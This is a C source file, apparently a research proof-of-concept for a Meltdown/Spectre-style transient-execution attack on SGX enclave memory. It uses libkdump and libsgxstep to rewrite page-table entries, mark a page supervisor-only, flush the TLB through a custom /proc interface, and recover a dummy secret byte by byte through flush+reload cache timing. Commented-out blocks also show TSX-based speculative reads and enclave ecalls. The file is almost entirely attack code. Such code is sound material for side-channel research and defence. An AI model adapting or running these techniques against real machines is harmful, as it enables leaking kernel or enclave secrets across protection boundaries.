#include <stdio.h>
#include <string.h>
#include <assert.h>

# include <unistd.h>
# include <pwd.h>
# define MAX_PATH FILENAME_MAX

// #include "sgx_urts.h"
// #include "App.h"
// #include "../Enclave1/Enclave1_u.h"
// #include "../Enclave2/Enclave2_u.h"

#include <stdlib.h>
#include <stdint.h>
#ifdef _MSC_VER
#include <intrin.h>
#pragma optimize("gt",on)
#else
#include <x86intrin.h>
#endif

#include <pthread.h>
#include <sched.h>
#include <sys/mman.h>
#include <sched.h> 
#include <fcntl.h>
#include <assert.h>

#include <signal.h>
#include <setjmp.h>
#include <errno.h>
#include <sys/syscall.h>
#include <assert.h>
#include "libsgxstep/pt.h"
#include "libkdump.h"

#define USE_RDTSCP
#define CACHE_MISS_THRESHOLD 180

// sgx_enclave_id_t global_eid[256];

size_t dummy_secret[80] = {0x42 << 12, 0x4 << 9, 0, 0, 0, 0, 0, 0, 0x42 << 9, 0, 0, 0, 0, 0, 0, 0, 
                    0x42 << 9, 0, 0, 0, 0, 0, 0, 0, 0x42 << 9, 0, 0, 0, 0, 0, 0, 0, 
                    0x42 << 9, 0, 0, 0, 0, 0, 0, 0, 0x42 << 9, 0, 0, 0, 0, 0, 0, 0, 
                    0x42 << 9, 0, 0, 0, 0, 0, 0, 0, 0x42 << 9, 0, 0, 0, 0, 0, 0, 0, 
                    0x42 << 9, 0x4 << 9, 0, 0, 0, 0, 0, 0, 0x42 << 9, 0, 0, 0, 0, 0, 0, 0};

// pthread_t pth_shadow;

uint64_t *pte_encl = NULL;
uint64_t *shadow_secret = NULL;
uint64_t *tlb_preload_page = NULL;

char buffer[300*4096];
int count[256];

int setexec = 0;

// ---------------------------------------------------------------------------
size_t secret;
size_t secret_shadow;

// void *shadow_thread(void *arg)
// {
//     cpu_set_t mask;
//     CPU_ZERO(&mask);
//     CPU_SET(7, &mask);
//     pthread_setaffinity_np(pthread_self(), sizeof(mask), &mask);

//     ecall_victim(global_eid[0]);

//     return NULL;
// }

int read_secret_from_enclave(size_t shadow)
{
    // size_t buffer = (size_t)libkdump_buffer_address();
    int retries = 1;
    // int res_stat[256] = {0};
    // int max_v = 0, max_i = 0;
    int i;
    int score[2] = {0, 0};
    uint8_t value[2] ={0, 0};
    unsigned status; 
    int monitor[3] = {4, 5, 0x47};

    // asm volatile ("movq (%0), %%rax" : : "c"(dummy_secret) : "rax");
    // asm volatile ("clflush (%0)" : : "c"(dummy_secret));
    // ecall_victim(global_eid[0]);
        // *pte_encl = MARK_NOT_PRESENT( *pte_encl );
    //         snprintf(buffer, sizeof(buffer), "%d", 0);
    //         int got = write(setexec, buffer, strlen(buffer));
    // libkdump_spectre_read((size_t)dummy_secret, (size_t)shadow_secret, score, value);
        // *pte_encl = MARK_PRESENT( *pte_encl );
    //         snprintf(buffer, sizeof(buffer), "%d", 0);
    //         got = write(setexec, buffer, strlen(buffer));
    // libkdump_spectre_result(score, value);
    // return 0;

    while (retries--) {
        // printf("O - Shadow @%p: 0x%lx\n", (size_t *)(shadow), *(size_t *)(shadow));
        // printf("dummy_secret = %p; *dummy_secret = %lx\n", (size_t *)dummy_secret, *(size_t *)dummy_secret);
        // if (!setjmp(buf)) {
        //     ecall_attack(global_eid[0], &shadow, &buffer);
        //     // printf("no error\n");
        // }

        // asm volatile ("movq (%0), %%rax" : : "c"(dummy_secret) : "rax");
        // asm volatile ("clflush (%0)" : : "c"(dummy_secret));
        // ecall_victim(global_eid[0]);
        // asm volatile ("movq (%0), %%rax" : : "c"(shadow) : "rax");
        // printf("ecall finished\n");
        // *pte_encl = MARK_NOT_PRESENT( *pte_encl );
            // snprintf(buffer, sizeof(buffer), "%d", 0);
            // int got = write(setexec, buffer, strlen(buffer));
        // asm volatile("cpuid":::"rax", "rbx", "rcx", "rdx");
        libkdump_spectre_read((size_t)dummy_secret, (size_t)shadow_secret, score, 
          value, (size_t)tlb_preload_page, MELTDOWN_STANDARD, CACHE_LEVEL_L1, TLB_DEFAULT, 0x42);
        libkdump_spectre_read((size_t)dummy_secret, (size_t)shadow_secret, score, 
          value, (size_t)tlb_preload_page, MELTDOWN_STANDARD, CACHE_LEVEL_MEMORY, TLB_DEFAULT, 0x42);
        // *pte_encl = MARK_PRESENT( *pte_encl );
            // snprintf(buffer, sizeof(buffer), "%d", 0);
            //  got = write(setexec, buffer, strlen(buffer));

        // *pte_encl = MARK_SUPERVISOR( *pte_encl );
        // *pte_encl = MARK_RESERVED( *pte_encl );
        // *pte_encl = MARK_NOT_PRESENT( *pte_encl );
        // for (i = 2; i >= 0; i--) {
        //     //info("flush");
        //     flush(buffer + (monitor[i]+10)*0x1000);
        //     //info("done"); 
        //     // asm volatile ("clflush (%0)" : : "c"(dummy_secret));
        //     // asm volatile ("movq (%0), %%rax" : : "c"(dummy_secret) : "rax");
        //     // asm volatile("cpuid":::"rax", "rbx", "rcx", "rdx");

        //     if ((status = _xbegin()) == _XBEGIN_STARTED) {
        //         //info("transaction");
        //         asm volatile(
        //             // "clflush (%%rcx)\n\t"
        //             // "mfence\n\t"
        //             // "movq (%%rcx), %%rcx\n\t"
        //             "movq (%%rcx), %%rax\n\t"
        //             // "mov $23, %%rax\n\t" 
        //             "add $5, %%rax\n\t"
        //             "shl $12, %%rax\n\t"
        //             "movq (%%rbx,%%rax,1), %%rbx\n\t"
        //             :
        //             : "c"(secret), "b"(buffer + 10*0x1000)
        //             : "rax");
        //         //info("trancaction finished (unexpected!)");

        //         // temp = *secret_ptr;
        //         _xend();
        //     }
        //     else {
        //         if (status != 0) printf("rtm failed due to %u", status);
        //     }

        //     // info("secret_ptr -> temp = %d", (int)temp);
        //     //info("reload");
        //     if (flush_reload((size_t)buffer + (monitor[i]+10)*0x1000)) {
        //         count[monitor[i]]++; 
        //         // if (i >= 1) {
        //         //     printf("%d hit", i);
        //         // }
        //     }

        //     // flush tlb
        //     snprintf(buffer, sizeof(buffer), "%d", 0);
        //     int got = write(setexec, buffer, strlen(buffer));
        // }
        // *pte_encl = MARK_PRESENT( *pte_encl );
        // *pte_encl = MARK_NON_RESERVED( *pte_encl );
        // *pte_encl = MARK_USER( *pte_encl );

    }
    printf("count[5] = %d, count[4] = %d, count[0x47] = %d\n", count[5], count[4], count[0x47]);

    libkdump_spectre_result(score, value);
    return (score[0] > score[1]) ? value[0] : value[1];
}

/* Application entry */
int main(int argc, char *argv[])
{
    setexec = open("/proc/setexec", O_WRONLY);
    assert(setexec >= 0);

    // sgx_launch_token_t token1 = {0};
    // sgx_status_t ret1 = SGX_ERROR_UNEXPECTED;
    // int updated1 = 0;
    // ret1 = sgx_create_enclave(ENCLAVE1_FILENAME, SGX_DEBUG_FLAG, &token1, &updated1, &global_eid[0], NULL);
    // if (ret1 != SGX_SUCCESS) {
    //     return -1;
    // }
    // ecall_main(global_eid[0], &secret);
    shadow_secret = (uint64_t *)remap_page_table_level((void *)dummy_secret, PAGE);
    printf("%p: %lx\n", dummy_secret, *dummy_secret);
    printf("%p: %lx\n", shadow_secret, *shadow_secret);
    int i, shadow_count = 0;
    // for (i = 0; i < 1000; i++) {
    //     shadow_count += reload_reload((size_t)shadow_secret);
    // }
    // printf("shadow_secret reload %d\n", shadow_count);
    // snprintf(buffer, sizeof(buffer), "%d %lx", 3, (size_t)dummy_secret);
    // int got = write(setexec, buffer, strlen(buffer));
    // snprintf(buffer, sizeof(buffer), "%d %lx", 3, (size_t)shadow_secret);
    // got = write(setexec, buffer, strlen(buffer));
    pte_encl = (uint64_t *)remap_page_table_level((void *)shadow_secret, PTE);
    // printf("%p old pte: %lx\n", shadow_secret, *pte_encl);
    *pte_encl = MARK_CACHEABLE( *pte_encl );
    snprintf(buffer, sizeof(buffer), "%d", 0);
    int got = write(setexec, buffer, strlen(buffer));
    // shadow_count = 0;
    // for (i = 0; i < 1000; i++) {
    //     shadow_count += reload_reload((size_t)shadow_secret);
    // }
    // printf("shadow_secret reload (cacheable) %d\n", shadow_count);
    *pte_encl = MARK_SUPERVISOR( *pte_encl );
    // *pte_encl = MARK_NOT_PRESENT( *pte_encl );
    // *pte_encl = MARK_RESERVED( *pte_encl );
    // printf("%p new pte: %lx\n", shadow_secret, *pte_encl);
    // snprintf(buffer, sizeof(buffer), "%d", 0);
    // got = write(setexec, buffer, strlen(buffer));

    // snprintf(buffer, sizeof(buffer), "%x %lx", 7, (size_t)shadow_secret);
    // int got = write(setexec, buffer, strlen(buffer));
    // snprintf(buffer, sizeof(buffer), "%x %lx", 0xc, (size_t)shadow_secret);
    // got = write(setexec, buffer, strlen(buffer));

    tlb_preload_page = (uint64_t *)mmap((void *)((((size_t)shadow_secret >> 12) << 12) + 0x1000), 
      0x1000, PROT_READ | PROT_WRITE, MAP_ANON|MAP_SHARED, -1, 0);
    assert(tlb_preload_page != MAP_FAILED);
    *(tlb_preload_page) = 0x65000;
    printf("mapped tlb_preload_page @%p\n", tlb_preload_page);
    
    //shadow = (char*)mmap((void*)0x7fff00000000, 0x100000000L, PROT_READ|PROT_WRITE, MAP_ANON|MAP_SHARED, -1, 0);
    //if (shadow == MAP_FAILED) return (1);
    
    // sgx_launch_token_t token2 = {0};
    // sgx_status_t ret2 = SGX_ERROR_UNEXPECTED;
    // int updated2 = 0;
    // ret2 = sgx_create_enclave(ENCLAVE2_FILENAME, SGX_DEBUG_FLAG, &token2, &updated2, &global_eid[1], NULL);
    // ecall_main_shadow(global_eid[1], &secret_shadow);

    // printf("Created Successfully.\n");




    libkdump_enable_debug(1);

    libkdump_config_t config;
    config = libkdump_get_autoconfig();
    if (argc > 2) {
        config.physical_offset = strtoull(argv[2], NULL, 0);
    }
    config.measurements = 3;
    config.retries = 100000;
    config.load_threads = 0;

    libkdump_init(config);
    libkdump_spectre_prepare(0, 0);
    
    

    // int i;
    for (i = 0; i < 256; i++)
        count[i] = 0;

    for (i = 0; i < 300*4096; i++)
        buffer[i] =0; 

    for (i = 0; i < 3; i++) {
        // ecall_victim(global_eid[0]);
        // int value = libkdump_read((size_t)shadow);
        int value = read_secret_from_enclave((size_t)secret);
        printf("%c", value);
        fflush(stdout);
        // vaddr++;
    }

    // *pte_encl = MARK_PRESENT( *pte_encl );
    // snprintf(buffer, sizeof(buffer), "%d", 0);
    // got = write(setexec, buffer, strlen(buffer));

    // libkdump_set_reserved_bit((size_t)shadow);

    // pthread_cancel(pth_shadow);

    // shadow = libkdump_remap(virt, paddr_backup);

    // libkdump_spectre_restore();
    libkdump_cleanup();

    /* Destroy the enclave */
    // sgx_destroy_enclave(global_eid[0]);
    // sgx_destroy_enclave(global_eid[1]);
    
    // printf("Info: SampleEnclave successfully returned.\n");

    //printf("Enter a character before exit ...\n");
    //getchar();
    return 0;
}
